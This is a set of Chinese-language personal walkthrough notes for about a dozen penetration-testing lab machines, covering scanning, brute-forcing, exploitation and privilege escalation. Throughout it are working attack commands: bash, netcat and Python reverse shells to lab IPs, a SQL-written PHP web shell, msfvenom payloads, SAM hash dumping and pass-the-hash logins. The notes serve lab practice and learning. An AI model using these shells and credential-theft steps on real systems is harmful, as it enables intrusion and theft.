好家伙 也是没用的 这个说实话真不会 看了wp才知道


```
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExMC4xMjgvODg4OCAwPiYx" | base64 -d | bash

bash -i >& /dev/tcp/192.168.110.128/8888 0>&1转成base64 这么去让那个界面执行反弹shell
```

![image.png](https://s2.loli.net/2025/05/09/UrX6BJfHpOGYhMm.png)

## 提权
也是没有头绪 也是没有去认真信息收集 错失一个信息点

![image.png](https://s2.loli.net/2025/05/09/2RGHzfkjEZ81TN5.png)



切换到nitish用户

![image.png](https://s2.loli.net/2025/05/09/wYVPBu4GrlZbvKO.png)

找到第一个flag

## 提权
发现这个东西 但不知道具体是啥
![image.png](https://s2.loli.net/2025/05/09/c7TzojPLmbUNeud.png)

讲实话这一部分人云亦云的

![image.png](https://s2.loli.net/2025/05/09/c7JZWmgAdlPiqOL.png)

遇到这种不同用户 用sudo -u

但sam中能执行root权限的是个猜字游戏 就先这样的
![image.png](https://s2.loli.net/2025/05/09/diIr2SzLgDEKkb9.png)

很南评价 感觉蛮无脑的 

![image.png](https://s2.loli.net/2025/05/09/hxZup3GgC65ajK2.png)

![image.png](https://s2.loli.net/2025/05/09/pB3mdlXESn5NFIY.png)

# GlasgowSmile
[[GlasgowSmile]]
## nmap扫描端口和文件爆破
![image.png](https://s2.loli.net/2025/05/07/CtVj3agYNuZ7HEh.png)

发现是一个joomla的网站

## joomla扫描

```
joomscan -u 
```

![image.png](https://s2.loli.net/2025/05/07/pMTcal4Vn8hsEAO.png)

找到了管理员登录的地方

这个时候没思路了 不知道怎么搞下去

其实有想过暴力破解 但无密码本 大字典太耗时间了

看了wp

```
cewl http://192.168.110.129/joomla -m 5 -d 1 -w joker.txt
```

根据网站的台词做成密码本 bp爆破密码

![image.png](https://s2.loli.net/2025/05/07/26dYUyHb98vXG3B.png)

成功登录进去 找到加载模版的地方1一般也是php执行代码的地方

![image.png](https://s2.loli.net/2025/05/08/rGqP6o34SbpwLM9.png)


反弹shell成功

![image.png](https://s2.loli.net/2025/05/08/ayxtgf9RQZY6l7z.png)


检查一下发现有个数据库


![image.png](https://s2.loli.net/2025/05/08/rgibQJaHA8phWU9.png)


都是base64编码的密码 解密一下

![image.png](https://s2.loli.net/2025/05/08/Sr3fNl6AiMbayCk.png)


挨个试试看 能切换用户吗

![image.png](https://s2.loli.net/2025/05/08/rqdRzTZGtM1H3Ij.png)

切换到rob之后查看一下/home/rob目录

![image.png](https://s2.loli.net/2025/05/08/BeJUZbcwktf1DTM.png)


找到个flag 还有提升root的提示

总感觉这个文字怪怪的 问了ai发现是个凯撒密码

![image.png](https://s2.loli.net/2025/05/08/OUNmFgJGXMlqBVP.png)

转一下知道了提示

但是没有一点头绪 还有个不知道怎么解编码

先这样空着 看了一眼wp 发现思路错了 这个编码应该**rot13**类似的加密算法

![image.png](https://s2.loli.net/2025/05/08/jCsvdkSKPzYb3Ho.png)


确实是昂 这样 后面的base64也能解得出来

知道了abner的账户密码

abner;I33hope99my0death000makes44more8cents00than0my0life0

![image.png](https://s2.loli.net/2025/05/08/xcABikL2woD18uF.png)

切换成功

![image.png](https://s2.loli.net/2025/05/08/IlrnV2C86wZuhRD.png)

找到第二个flag和提示

提示没啥卵用

其实这也是个思路  因为用户有三个 还差一个penguin 可以全局找与penguin有关的文件

```
 find / -iname *penguin* 2>/dev/null
```

![image.png](https://s2.loli.net/2025/05/08/BeJPTNAg1mouEtS.png)

假如说这个压缩包没有这个名字就炸刚了

python传回kali 进行解压

![image.png](https://s2.loli.net/2025/05/08/D6gYheiyrQ1IlGZ.png)

找到新的提示

![image.png](https://s2.loli.net/2025/05/08/bBUxvli1oVuCNAa.png)


用给出来的密码登录成功

第三个flag

![image.png](https://s2.loli.net/2025/05/08/cUHl7sFkvoQCuiw.png)

实在是没有思路了 看了wp 说是用了pspy

![image.png](https://s2.loli.net/2025/05/08/Igq2yRTMkQd8cbZ.png)

找到这个奇怪文件

因为是以root权限执行 我们写入反弹shell 借此来执行反弹shell

```
echo 'nc -e /bin/bash 192.168.110.128 7777' > .trash_old
```
[[shell和提权#^0be5ac]]

反弹成功 获得root权限

![image.png](https://s2.loli.net/2025/05/08/ZOzlxitkXBAK7Wm.png)


![image.png](https://s2.loli.net/2025/05/08/ZlzLJ5ebBW8PVSI.png)


# sar
## nmap扫描端口和文件爆破
![image.png](https://s2.loli.net/2025/05/09/7Wicwny9StprbTf.png)

只有一个80端口 文件爆破一下

![image.png](https://s2.loli.net/2025/05/09/DKgUflmOdZTYWaR.png)


查看一下 

php版本信息
![image.png](https://s2.loli.net/2025/05/09/rqsvx1lhyPfYJOF.png)


robots.txt告诉我们一个新的路径

![image.png](https://s2.loli.net/2025/05/09/r3HzgRcCPZQJG6y.png)


![image.png](https://s2.loli.net/2025/05/09/wzGs7CYpPWKByoO.png)


爆破一下路径 感觉有线索

![image.png](https://s2.loli.net/2025/05/09/KIo541Vxh8qC9RQ.png)



![image.png](https://s2.loli.net/2025/05/09/vZB1I8hFquNYdVU.png)

下载了一个压缩包

![image.png](https://s2.loli.net/2025/05/09/HrIpC18wRJFGnLB.png)

还有别的信息
![image.png](https://s2.loli.net/2025/05/09/Jb2gExXa3Lsodjq.png)

先不管他 我们发现是用sar2html 3.2.1这个东西 查看一下版本漏洞

![image.png](https://s2.loli.net/2025/05/09/tDixgq72l8sXBor.png)

发现有几个能利用的 

## 漏洞利用
Sar2HTML 3.2.1 - Remote Command Execution远程命令执行

![image.png](https://s2.loli.net/2025/05/09/PIn89ZqVUYdKvON.png)



![image.png](https://s2.loli.net/2025/05/09/w5eY1OQgV3idMt9.png)

试试看

![image.png](https://s2.loli.net/2025/05/09/WygPmw976MEdX2e.png)

字样变成了id

![image.png](https://s2.loli.net/2025/05/09/9e3oFRlQaEfm7TM.png)

为了方便我们用了第一个python脚本比较方便漏洞利用
![image.png](https://s2.loli.net/2025/05/09/lFGvNUedO5KcfbS.png)

反弹shell成功
![image.png](https://s2.loli.net/2025/05/09/NR6DKu3yldJF1Um.png)
## 提权
找到第一个flag
![image.png](https://s2.loli.net/2025/05/09/q6KfF7hZI2HBueE.png)

找到有个定时任务

![image.png](https://s2.loli.net/2025/05/09/Jqdoxnv47IyVufD.png)

![image.png](https://s2.loli.net/2025/05/09/ORTXiBcUWh49rdf.png)

这个脚本只能用户本人去改 

![image.png](https://s2.loli.net/2025/05/09/Ktfj25uJ19XONPQ.png)

我们可以用这里面的脚本开刀

这个脚本的权限是谁都可以写

![image.png](https://s2.loli.net/2025/05/09/1bcXGNu5tI86ej2.png)


修改成功 写入一个反弹shell 

因为脚本是固定时间以root权限运行 写完等会就能反弹成root权限

![image.png](https://s2.loli.net/2025/05/10/mglSCwEsi5hzFvB.png)

# tiki
[[tiki]]
## nmap扫描端口和文件爆破
有个80端口和samba服务

有个robots.txt 告诉我们一个新的路径
![image.png](https://s2.loli.net/2025/05/10/MCrvXV5Z3LQHSUd.png)

## 信息收集
![image.png](https://s2.loli.net/2025/05/10/H4Gho5FEj93aMuK.png)


![image.png](https://s2.loli.net/2025/05/10/nduqJ7hzB1FiMUw.png)

但都是跳转的 需要登录

![image.png](https://s2.loli.net/2025/05/10/xdz9cNRSqZFeGV8.png)

但没思路了

## 漏洞利用
![image.png](https://s2.loli.net/2025/05/10/ERYcB8OQkvgzrIa.png)

先搁置一下 

## smb服务枚举
没想到smb服务了 

```
smbclient -L \\192.168.110.133

smbclient //192.168.110.133/Notes
```

![image.png](https://s2.loli.net/2025/05/10/XjxSVD71MBYKiCy.png)

发现有一个文件 访问看看

![image.png](https://s2.loli.net/2025/05/10/aH19GSLz2VbNRoh.png)


![image.png](https://s2.loli.net/2025/05/10/s4eaVUx63ALmWyK.png)

一个小提示 刚好就是登录界面的密码  登录成功 找找有啥反弹shell的地方吗

也没有 

退回到漏洞利用 也算偶然发现 居然有个绕过认证

![image.png](https://s2.loli.net/2025/05/10/JjTVXnfEGtcPAQH.png)

利用这个脚本进行
运行完脚本 用bp抓包输入空木马即可登录成功

![image.png](https://s2.loli.net/2025/05/10/TbdxoQZRNs5gzlp.png)

看了一下wp 原理蛮有意思的 管理员账户被爆破60次以上时将被锁定，此时使用空白密码即可以管理员身份登录后台。

## 反弹shell
想用文件上传的 也发现了上传点 但没法找到路径和执行的地方

看了眼wp 才知道 找到个账户密码

![image.png](https://s2.loli.net/2025/05/10/oMmifAzxNtQIJH8.png)


![image.png](https://s2.loli.net/2025/05/10/38DRwxurnNUjphd.png)

## 提权
ssh登录进去 sudo -l发现有完全的权限

![image.png](https://s2.loli.net/2025/05/10/kg1Vwma9eqOu83c.png)


![image.png](https://s2.loli.net/2025/05/10/HlBjLdXUcVpzDwr.png)


# Lord Of The Root: 1.0.1(mysql提权)
[[Lord Of The Root 1.0.1]]
## nmap扫描端口
只发现了一个22端口 ssh连接 应该是从ssh那边下手吧

## ssh敲门
![image.png](https://s2.loli.net/2025/05/10/sqZGADbEW3JrlcR.png)


简单登录一下ssh 看有提示吗 应该是ssh敲门

```
knock -v ip 1 2 3
```

![image.png](https://s2.loli.net/2025/05/10/JGCicTZfnR3WwbB.png)

再次端口扫描就会发现有个1337端口

![image.png](https://s2.loli.net/2025/05/10/J3Wxe4rsZaNwdqv.png)


## 文件目录爆破
发现三个图片 看了源码和binwalk都没有藏东西


其实是在robots.txt中 有个双层base64编码 解码能知道新的路径
![image.png](https://s2.loli.net/2025/05/10/LdpVExD4Xbv8Btg.png)


![image.png](https://s2.loli.net/2025/05/10/vsEZDK2Xmwpycb4.png)


是个登录界面  目录爆破也只有一个路径

![image.png](https://s2.loli.net/2025/05/10/RbkUQryCEPTYlVd.png)


输入啥都没有报错的提示 sqlmap一把索看看 是个时间盲注

![image.png](https://s2.loli.net/2025/05/10/CXzJUmsxd5N4VvW.png)

过了一段时间总算爆出来了

我们试试能否登录刚刚的网页

但都是一样的登录界面
## hydra破解ssh


![image.png](https://s2.loli.net/2025/05/10/2NnY4TcD189Bdre.png)


成功登录ssh

![image.png](https://s2.loli.net/2025/05/10/CBmbDXJhcHSv6Ix.png)


## 提权
### 内核提权
找到一个合适的

```
ubuntu 14.04  linux kernel 
```


![image.png](https://s2.loli.net/2025/05/10/foHgZyheanWdPK5.png)



![image.png](https://s2.loli.net/2025/05/10/SFlZEpbe4ThVUL8.png)

提权成功

#  LemonSqueezy: 1（last）
[[LemonSqueezy1]]
## nmap扫描端口和文件爆破
发现有个phpmyadmin和wordpress

## wordpress枚举
枚举出两个用户
![image.png](https://s2.loli.net/2025/05/10/NFfIkOKMa7ijhPV.png)

找到了orange的密码

orange:ginger
![image.png](https://s2.loli.net/2025/05/10/FuwTers7PgUEqpZ.png)


在orange的推文中找到一个疑似账户密码还是别的东西

![image.png](https://s2.loli.net/2025/05/10/CJDUYwHmF72TkVt.png)


好家伙 phpmyadmin的密码 账户是orange

登录成功

在sql语句中插入执行命令的代码 这招太阴了

```
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/wordpress/backdoor1.php" 
```

然后访问wordpress/backdoor1.php就能进行命令执行

![image.png](https://s2.loli.net/2025/05/10/4MmGcsWg12KHRQY.png)

可以运行 准备反弹shell

![image.png](https://s2.loli.net/2025/05/10/nlSCQOTk32isPIU.png)

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.110.128",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'

```

反弹shell成功
![image.png](https://s2.loli.net/2025/05/10/JuUgsoSX56dbHOK.png)

找了/home和wordpress都没有有用的信息

查看定时计划

![image.png](https://s2.loli.net/2025/05/10/nXZHJVtpSh6WLa9.png)

总算是也有线索了

![image.png](https://s2.loli.net/2025/05/10/JNgU8PQpACa6LIo.png)

#注意 修改pytohn脚本
是个python脚本 以root权限运行

修改一下python脚本

```
echo 'import os; os.system("/bin/nc 192.168.110.128 7778 -e /bin/bash")' > /etc/logrotate.d/logrotate
```

修改成功
![image.png](https://s2.loli.net/2025/05/10/OSEbh347T6VcLxU.png)

很奇怪 登录好久还没有成 改了一下 改成python的fantshell

```
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.110.128",7778));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' > /etc/logrotate.d/logrotate
```

理论是反弹成功了  但我这里很奇怪 一直没反应

留个悬念

# Year of the Owl(思)
#windows 
[[Year of the Owl]]
## nmap扫描端口

```
nmap -sCV -sT -Pn -A
```

![image.png](https://s2.loli.net/2025/05/10/phl4Istq6A5PMVW.png)

能发现443端口知识的四种发包方法 开放mysql，http，rdp服务

![image.png](https://s2.loli.net/2025/05/10/nZDyMYToK2Uv6te.png)


这里能看到有smb服务

我们看看能枚举出smb服务的信息吗

然而并不能 根本没信息 基本都是进不去 要么就是不通

## 全新理解
nmap是默认扫描tcp端口 不扫描udp端口

```
nmap -sCV -sU -Pn -A 
```

只能说等了半天也没有完成

转换思路看看snmp

![image.png](https://s2.loli.net/2025/05/11/AQ6bqsGOJTg1kIF.png)

真有一个端口

用onesixtyone去扫描snmp服务 发现有信息 

```
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.10.44.22 
```

![image.png](https://s2.loli.net/2025/05/11/zM5lm3nAjcEuoUQ.png)


## 枚举snmp服务
### snmp-check
snmp-check进行枚举

```
snmp-check 10.10.44.22 -p 161 -c openview
```

![image.png](https://s2.loli.net/2025/05/11/Jtm79U6wTLxicjV.png)

枚举出了用户 下面还有很多信息

### msf枚举snmp
![image.png](https://s2.loli.net/2025/05/11/3Xft7eGBmoEcus8.png)


发现有个新的用户 我们想办法利用他

## 暴力破解rdp

^eec231

用hydra暴力破解jareth用户

```
hydra -l Jareth -P /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt rdp://10.10.44.22
```

搞笑了 没有破解出来 很奇怪

## crackmapexec破解密码

看了wp 又学习了骚操作

用crackmapexec破解密码

```
PYTHONWARNINGS="ignore" crackmapexec winrm 10.10.44.22 -u Jareth -p /root/rockyou.txt | grep '(Pwn3d!)'

PYTHONWARNINGS="ignore"
不加这个参数 我这个环境运行不了

```

![image.png](https://s2.loli.net/2025/05/11/9hkVLYvibEdxC1l.png)

## 提权
用Evil-WinRM工具来获得shell
```
evil-winrm -u jareth -p sarah -i 10.10.44.22
```

![image.png](https://s2.loli.net/2025/05/11/lzfTZQPgrJF56cV.png)

找到第一个flag
![image.png](https://s2.loli.net/2025/05/11/LdjFpXZkqbOinfG.png)


话说回来这个很大难度 没在Windows中提权 没多大经验 

这个是在用户的回收站中找到了备份内容

```
gci -hidden .
找隐藏的文件

gci -path 'C:\$Recycle.Bin' -h
查看回收站内容

查看指定sid的回收站
```

![image.png](https://s2.loli.net/2025/05/11/s7i9T8DbzuNOkxY.png)


![image.png](https://s2.loli.net/2025/05/11/kUQlV9MFxE7R8nv.png)


找到了备份的信息

```
cd '$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001'
```

![image.png](https://s2.loli.net/2025/05/11/xjGuWlwge3ztQbq.png)

把备份内容放到用户目录

![image.png](https://s2.loli.net/2025/05/11/cUJwraWuEp18mgq.png)


提取hash值
```
impacket-secretsdump -sam sam.bak -system system.bak local
```
![image.png](https://s2.loli.net/2025/05/11/7t2CEmwMZUAYB6j.png)


获得admin权限
```
evil-winrm -u Administrator -p aad3b435b51404eeaad3b435b51404ee:6bc99ede9edcfecf9662fb0c0ddcfa7a -i 10.10.44.22
```

![image.png](https://s2.loli.net/2025/05/11/2hDCI5rTkHbXfiw.png)



![image.png](https://s2.loli.net/2025/05/11/Eue2XTZKqb4NaHv.png)

# cyberlens
#windows 
[[cyberlens]]
## nmap扫描端口
发现有两个web端口和rdp端口 从这两个地方下手
![image.png](https://s2.loli.net/2025/05/11/LIArCDy3MTNw8sq.png)

## 枚举snmp和文件目录
smbclient 枚举不行
![image.png](https://s2.loli.net/2025/05/11/Ka8kVEfiWPJvwzY.png)


enum4linux也没有
![image.png](https://s2.loli.net/2025/05/11/ShEncfQmUoHDO2p.png)

目录爆破也是有点费劲 看看网页有啥信息吗

![image.png](https://s2.loli.net/2025/05/11/MHUtlqdCvcEbxnN.png)

疑似文件上传 但没啥卵用

## 重新扫描端口
没看全端口扫描 全端口再试试 漏了一个61777端口
```
nmap -sCV -sT -Pn -v -p- 10.10.46.40
```

![image.png](https://s2.loli.net/2025/05/11/xXPepj2mFbqBWaZ.png)

访问看看

![image.png](https://s2.loli.net/2025/05/11/krycUBG9dwVgPAD.png)

是个tiki服务器

## msf攻击
![image.png](https://s2.loli.net/2025/05/11/L6KDdziValOM3gB.png)


获得meterpreter的shell
![image.png](https://s2.loli.net/2025/05/11/QvVk4Dxcpg7zNJB.png)


## 提权
找到第一个flag
![image.png](https://s2.loli.net/2025/05/11/JpEfcqkK8rW1RBT.png)


一顿搜索找到一个txt
![image.png](https://s2.loli.net/2025/05/11/5bUQZpTv46mVjFu.png)


有个小提示

![image.png](https://s2.loli.net/2025/05/11/wEJ2jmzR3aK5M4B.png)

有了账户密码 远程登录一下 看到有两个特殊文件

![image.png](https://s2.loli.net/2025/05/11/dw5aRK1ZCFUhkWr.png)

但没啥用
## 别的操作
我们上传一个winpeas来查看详细信息
![image.png](https://s2.loli.net/2025/05/11/QMiGUL8WrY7zf2l.png)

.\运行exe
![image.png](https://s2.loli.net/2025/05/11/TpxbqBNm3H45fV1.png)


![image.png](https://s2.loli.net/2025/05/11/apFU1b4k3hIRlDO.png)

这个是个要点 意思就是可以高权限运行msi[[cyberlens#注册表键值的作用​​]]

制作一个反弹shell

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.40.203 LPORT=8888 -f msi -o shell.msi

curl http://10.17.40.203:8000/shell.msi -o shell.msi

.\shell.msi
```

反弹成功

![image.png](https://s2.loli.net/2025/05/11/iTr4NI1suZkfSQJ.png)

获得第二个flag
![image.png](https://s2.loli.net/2025/05/11/B8npWyoVxIUN1Ri.png)

#  Weasel
[[Weasel]]
## nmap扫描端口
发现有个5985端口和smb服务

访问5985没有反应

又扫描出来8888端口
![image.png](https://s2.loli.net/2025/05/11/wp8TJ9hGM75LbnP.png)

## smb枚举
![image.png](https://s2.loli.net/2025/05/11/tzOrPY58fgTimLK.png)

有一个文件夹可以看看
![image.png](https://s2.loli.net/2025/05/11/yjCgW4uhJ5HKwF2.png)

蛮多可以利用的

访问了这些发现应该是一个python环境的网站 大概是这样

![image.png](https://s2.loli.net/2025/05/11/vb1E3dOk5ZjIGoV.png)

刚好在这些文件夹中发现了一个token 试试看能否登录

![image.png](https://s2.loli.net/2025/05/11/DLgacWjqkyXRZVI.png)

成功登录 我们想办法反弹shell jupyter是一个执行python代码的地方 我们用python反弹shell的语句进行反弹

```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.17.40.203",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")
```


反弹成功
![image.png](https://s2.loli.net/2025/05/11/gTwsPypvhbnf6Qi.png)

## 提权
![image.png](https://s2.loli.net/2025/05/11/Pebx83nvzoGZNhJ.png)


![image.png](https://s2.loli.net/2025/05/11/KOPjUiqLVwbfGZp.png)

但还是利用到了sudo -l的内容

```
cp /bin/bash /home/dev-datasci/.local/bin/jupyter
sudo /home/dev-datasci/.local/bin/jupyter
```
因为是没有密码的 我们可以直接sudo来运行 但我们的jupyter没有执行命令的 把/bin/bash复制到jupyter中 sudo运行 就能获得root权限

![image.png](https://s2.loli.net/2025/05/11/oQHvcpbI2qBFwik.png)

![image.png](https://s2.loli.net/2025/05/11/2T6NJh1mlWiwyHU.png)

发现一个可能是秘钥的东西

这不是全部 你要知道 我们这个机子是Windows的 我们获得的只不过是Windows机子中的linux的root权限 可以想成是Windows部署的wsl

wsl的文件一般在mnt中

![image.png](https://s2.loli.net/2025/05/11/nOApaH1su9icbkl.png)



## 提权Windows
### 挂载
```
mount -t drvfs 'c:' /mnt/c 
-t drvfs ：此选项指定要挂载的文件系统的类型。在这种情况下，drvfs 是指 WSL 用于访问  Windows 驱动器的文件系统驱动程序。
```

![image.png](https://s2.loli.net/2025/05/11/UACP1BXkmdMHx6I.png)

然后c文件夹就会有我们的Windows文件

在wsl linux中挂载c盘

第一个flag
![image.png](https://s2.loli.net/2025/05/11/oFXwpYbynL5ZCgx.png)

第二个flag
![image.png](https://s2.loli.net/2025/05/11/tesCFPiM9Zvmbua.png)


# Hack Smarter Security 
## nmap扫描端口
![image.png](https://s2.loli.net/2025/05/12/RrBDQ1A6SFMGh2I.png)

发现有个ftp匿名登录 进去看看有啥信息吗


# Digitalworld. Local (Mercy v 2)
[[Mercy v2]]
## Nmap 扫描端口
![image.png](https://s2.loli.net/2025/05/14/LS5gYhtDaMVJNd6.png)

发现有 80 端口和 8080 端口

还有Smb服务

![image.png](https://s2.loli.net/2025/05/14/6dXcloeqNsUPJCB.png)

8080 端口是个 Tomcat 服务
![image.png](https://s2.loli.net/2025/05/14/IybvL8sNUwtPKzR.png)


## 80 端口
目录爆破出 robots. txt 访问看看
![image.png](https://s2.loli.net/2025/05/14/jyOzlHv7EBPV193.png)


告诉我们一个新的路径
![image.png](https://s2.loli.net/2025/05/14/RpcYk4qrFIviKzu.png)


一眼 base 64 编码
```
echo "xxxxxx" | base64 -d
```
![image.png](https://s2.loli.net/2025/05/14/mBIeA9jUghH3tO8.png)


这个时候就有点没啥头绪了继续寻找看有最重要的路径吗

### 8080 端口
转战 8080 端口

找到一个登陆界面

![](file:///C:/Users/14531/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png)

这个时候有点没思路了想起来还有个 smb 服务没有搞
## Smb 枚举
```
smbclient -l \\ip
```

![image.png](https://s2.loli.net/2025/05/14/5lcWHgNEJwMxaP8.png)


发现有个 qiu 应该是用户或者文件名

```
smbclient -U qiu \\\\192.168.61.137\\qiu
```

需要输入密码在上面的一个提示中说道有个用户的密码是 password 我们测试一下

![image.png](https://s2.loli.net/2025/05/14/4Ay1BZbEzlcHu8w.png)

指定用户登录

这个private是个尤物 进去发现有线索

![image.png](https://s2.loli.net/2025/05/14/1fBxaMkyu6ITNzv.png)


我们挨个找找

![image.png](https://s2.loli.net/2025/05/14/XIn9bOeP1JZYAjk.png)

有个 config 配置文件
![](https://s2.loli.net/2025/05/14/XIn9bOeP1JZYAjk.png)

![image.png](https://s2.loli.net/2025/05/14/wCiAZgo4flGt5FP.png)

没猜错的话应该就是 ssh 敲门了依次敲某个顺序的门就会打开指定端口

### ssh 敲门

![image.png](https://s2.loli.net/2025/05/14/hWcjbERoxSdOU9C.png)

![image.png](https://s2.loli.net/2025/05/14/TMWo5u7qF1GZLRS.png)

分别按照 openssh 和 opehttp 的端口依次敲门
```
nc -z
```

成功打开 80 端口和 ssh 端口

## 80 端口信息收集
![image.png](https://s2.loli.net/2025/05/14/XAldzMbjqZkWsfx.png)

文件目录爆破
![image.png](https://s2.loli.net/2025/05/14/7nFjzxIAK2lWcCB.png)


依旧有个 robots. txt
![image.png](https://s2.loli.net/2025/05/14/7omBirPsHl2bj6X.png)

其中一个网站是提示
![image.png](https://s2.loli.net/2025/05/14/2ZvwAShxR4LmeuP.png)

看提示可以知道官网是已经过时的应该有漏洞可以利用

查看一下这个网址发现有个 rips 0.53 的版本搜索看看
![image.png](https://s2.loli.net/2025/05/14/OUjyM4wxLh1RA8g.png)

是个文件上传
![image.png](https://s2.loli.net/2025/05/14/YIclCujsr7LEQ6o.png)

在 8080 端口中有个 note 
![image.png](https://s2.loli.net/2025/05/14/z1oGUT9Scr38sF5.png)


利用文件包含我们访问了这个文件能找到用户和密码

![image.png](https://s2.loli.net/2025/05/14/rzk71iVQdWBU5xy.png)


找到两个用户
![image.png](https://s2.loli.net/2025/05/14/Tr5hUquzEgoeLwA.png)

![image.png](https://s2.loli.net/2025/05/14/W82LNfqoa4Hnyib.png)


登录网站看看怎么个事

登录成功是个 tomcat

![image.png](https://s2.loli.net/2025/05/14/dKL4vCpzPixgYyt.png)


![image.png](https://s2.loli.net/2025/05/14/XuVfIUPCqT4r52W.png)


在下面发现有个文件上传只能上传 war 文件

## 反弹 shell

现在我们用Msfvenom制作payload

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.61.135 LPORT=8888 -f war -o shell.war
```

准备用msf反弹shell

用到Multi/handler

![image.png](https://s2.loli.net/2025/05/14/y8FKkqCcBs1NGPn.png)

反弹成功

进去之后用我们已知的三个用户进行登录看看这三个用户有什么权限和值得利用的地方吗

## 提权
找找文件

![image.png](https://s2.loli.net/2025/05/14/GkJjWpTt8RqY1Br.png)

![image.png](https://s2.loli.net/2025/05/14/avrLY5cdUyQN4AZ.png)


![image.png](https://s2.loli.net/2025/05/14/LJX3T1NjpF2diSe.png)

都是没啥用的信息

接着切换切换到Fluffy 

![image.png](https://s2.loli.net/2025/05/14/woDf5CrghUEmYR4.png)


发现在用户的目录中找到个隐藏文件
![image.png](https://s2.loli.net/2025/05/14/GYeuCNKcSLfiFjt.png)


![image.png](https://s2.loli.net/2025/05/14/xYKEtXF2ZPNCgm4.png)


![image.png](https://s2.loli.net/2025/05/14/WYBxH7qhJmGiRDK.png)

发现这个 timelock 是以 root 权限运行的可以尝试利用一下这个脚本

```
echo 'bash -i >& /dev/tcp/192.168.61.135/4444 0>&1' > timeclock
```

![image.png](https://s2.loli.net/2025/05/14/Nj7wJTfYhSuWmkE.png)

写完等一会就能获得 root 权限

![image.png](https://s2.loli.net/2025/05/14/aFK3vpBQe5LmgIu.png)


#  Hack Me Please
[[Hack Me Please]]
## nmap 爆破端口
![image.png](https://s2.loli.net/2025/05/15/GujMdJlnzyIbhw3.png)

有个 80 端口和 3306 数据库的端口

## 信息收集
![image.png](https://s2.loli.net/2025/05/15/Vf83TrOBDjepPbc.png)

感觉没啥重要的东西继续收集

![image.png](https://s2.loli.net/2025/05/15/NUGdFpAVfuDnyP2.png)

发现一个 Modernizr[2.8.3-respond-1.4.2. min] 感觉对我们有帮助

也是没啥用的就是一个 js 库

回头重新收集
![image.png](https://s2.loli.net/2025/05/15/GRVx8pa3FAydzUI.png)

发现还有一个隐藏的端口

但没啥用

![image.png](https://s2.loli.net/2025/05/15/9NR3wIfDozMb5L1.png)

只能慢慢在 js 中寻找了

![image.png](https://s2.loli.net/2025/05/15/1WgdBcDt7CLaxTr.png)

好家伙有个路径

![image.png](https://s2.loli.net/2025/05/15/ZLC1otEaUIyFqWr.png)

是个登录界面是 seeddms 的搜搜有漏洞吗

但暂时不知道怎么利用还没登陆

只能继续寻找这个路径有什么可以利用的吗

![image.png](https://s2.loli.net/2025/05/15/s5AUENHeDvxIVTk.png)


![image.png](https://s2.loli.net/2025/05/15/2j7Iev9sFi6V48L.png)

找到一个界面看看

点击安装会发现一个提示
![image.png](https://s2.loli.net/2025/05/15/IKG9uFivt2bOEzU.png)

这也许是个思路提示我们要找哪些路径

但都是禁止访问的
![image.png](https://s2.loli.net/2025/05/15/FZ9REaSsHj35I4L.png) 


发现有几个路径但都是查看不了的被禁止了

照顾一下 conf 文件
```
dirb http://192.168.110.139/seeddms51x/conf/ -X .php,.xml,.txt,.html
```

![image.png](https://s2.loli.net/2025/05/15/YvZln5Tbct2gfGz.png)


发现有个 settings. xml

![image.png](https://s2.loli.net/2025/05/15/3CeLhOjpYXRnz4b.png)

访问看看

![image.png](https://s2.loli.net/2025/05/15/PYdRCi3v7cZt1HF.png)

找到数据库账户和密码

## 登录数据库
```
mysql -useeddms -p -h192.168.110.139 --skip-ssl
因为不加--skip-ssl会报错
```

![image.png](https://s2.loli.net/2025/05/15/r97TqHeSY1uMItX.png)


找到账户
![image.png](https://s2.loli.net/2025/05/15/fqZTi5UsPSKgxGB.png)

这个并不是账户

![image.png](https://s2.loli.net/2025/05/15/9umGzjBspVfEbRy.png)

细看还发现有另外一个 user 表

![image.png](https://s2.loli.net/2025/05/15/i2qaJXTCnEQZPjz.png)

是个加密的 MD 5  但查了好几个网站都没有解码 

只能把密码替换成我们想要的密码

```
 update tblUsers（表名） set pwd=md5('123456') where login='admin';
```


![image.png](https://s2.loli.net/2025/05/15/OktKuXlrVBfj62W.png)

登录成功

接着就是找文件上传点上传一个反弹 shell 的文件
![image.png](https://s2.loli.net/2025/05/15/g8pZuByl5PI2VES.png)

但有个问题了不知道文件的路径在哪里看了 wp 发现可以利用一个漏洞

![image.png](https://s2.loli.net/2025/05/15/Ko8grY6dzOEuG7f.png)

大概就是这个路径

![image.png](https://s2.loli.net/2025/05/15/5vbnwrRqfcsZUJH.png)


上传的 php 文件都会被改成 1. php  document_id 就是你文件的 id

![image.png](https://s2.loli.net/2025/05/15/siQ6Nz83kHPACYy.png)


获得反弹 shell

## 提权
信息收集
![image.png](https://s2.loli.net/2025/05/15/xm6yCXqZ2F3odOp.png)


在 opt 文件夹中发现有个脚本
![image.png](https://s2.loli.net/2025/05/15/mZxz32hwOnoULEu.png)


![image.png](https://s2.loli.net/2025/05/15/rAXyRdYkPE9Ds3N.png)

突然想到个办法就是我们在上面找到过一个用户刚好是 saket 直接试试看能登录吗

![image.png](https://s2.loli.net/2025/05/15/eY1GJznDQ7hOpkB.png)

登录之后发现可以直接提权到 root

# dawn
[[dawn]]
## nmap 扫描端口
![image.png](https://s2.loli.net/2025/05/16/hTQz4qLsoNCuZ6J.png)

![image.png](https://s2.loli.net/2025/05/16/hSDnrtZ4wcOYlRM.png)

有个 smb 服务可以进去看看有什么可以用的信息吗

## 网站信息收集
